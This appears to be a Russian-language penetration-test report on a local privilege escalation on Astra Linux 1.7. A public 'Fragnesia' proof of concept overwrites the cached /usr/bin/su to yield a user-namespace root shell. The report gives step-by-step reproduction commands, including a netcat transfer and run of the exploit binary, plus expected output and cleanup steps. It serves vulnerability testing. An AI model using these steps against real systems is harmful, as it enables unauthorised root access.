# Тест эксплуатации Fragnesia (LPE via espintcp page cache replace)

## Описание
Тест проверяет локальное повышение привилегий (LPE) через уязвимость в механизме `espintcp_splice` и подмену страниц кэша. Эксплойт изменяет содержимое read-only страницы /usr/bin/su, внедряя shellcode, после чего при запуске su получается root-оболочка.

## Среда выполнения
- ОС: Astra Linux 1.7_x86-64
- Пользователь: ksb / astra (uid=1000)
- Целевой бинарник: /usr/bin/su
- IP-адрес: ***

## Результат теста
СТАТУС: УСПЕШНО
Исходный пользователь: ksb (uid=1000)
Полученный пользователь: root (uid=0)

### Вывод после эксплуатации
bash: /root/.bashrc: Permission denied
root@astra-1:/home/ksb/testLPE/crypt/pocs/fragnesia/pocs/fragnesia# whoami
root
root@astra-1:/home/ksb/testLPE/crypt/pocs/fragnesia/pocs/fragnesia# id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

## Пошаговая инструкция для повторения

### Шаг 1. Клонирование и компиляция эксплойта
Выполнить на машине, где есть доступ к интернету и gcc:

git clone https://github.com/v12-security/pocs.git
cd pocs/fragnesia
gcc -o exp fragnesia.c

### Шаг 2. Запуск netcat-сервера
В отдельном терминале на той же машине (IP ***):

nc -l -p 1234 < exp

### Шаг 3. Получение и запуск на целевой системе
На уязвимой машине (пользователь astra или ksb):

nc *** 1234 > fragnesia
chmod +x fragnesia
./fragnesia

### Шаг 4. Альтернативный запуск (из репозитория)
Если эксплойт уже скомпилирован локально:

cd ~/testLPE/crypt/pocs/fragnesia
./exp

### Ожидаемый вывод при успехе
[*] smashing 192 bytes into read-only page cache
[==================================================] 192/192 (100%)
[+] BUG: changed requested copied byte range to desired values
[+] smashed XX -> 00  index=...
bash: /root/.bashrc: Permission denied
root@astra-1:~#

## Важные замечания
1. Полученный root работает внутри пользовательского пространства имён (userns)
   Проверка: cat /proc/self/uid_map
   0       1000          1

2. apt install не работает, т.к. /var/lib/dpkg принадлежит nobody:nogroup

3. Для полного root вне userns требуется дополнительная эскалация или перезагрузка

## Очистка системы
Восстановление оригинального /usr/bin/su:
- Перезагрузка ОС
- Или перезапись из резервной копии
- Или перемонтирование образа

## Источник
Эксплойт от v12-security
https://github.com/v12-security/pocs/tree/main/fragnesia
